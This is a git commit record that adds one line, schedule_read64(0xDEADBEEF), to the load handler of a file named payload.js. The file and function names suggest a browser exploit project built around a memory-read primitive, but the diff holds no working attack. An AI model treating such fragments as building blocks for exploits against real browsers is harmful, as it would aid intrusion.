651fc4d4b55bc1a56a0774615a7741918fd02968
madissygis <madissygis@gmail.com>
2025-06-30 02:08:10 +0300

    Update payload.js

--- payload.js
+++ payload.js
@@ -2,4 +2,6 @@ window.onload = () => {
   const log = document.createElement("pre");
   log.textContent = "✅ payload.js loaded!";
   document.body.appendChild(log);
+
+  schedule_read64(0xDEADBEEF);
 };
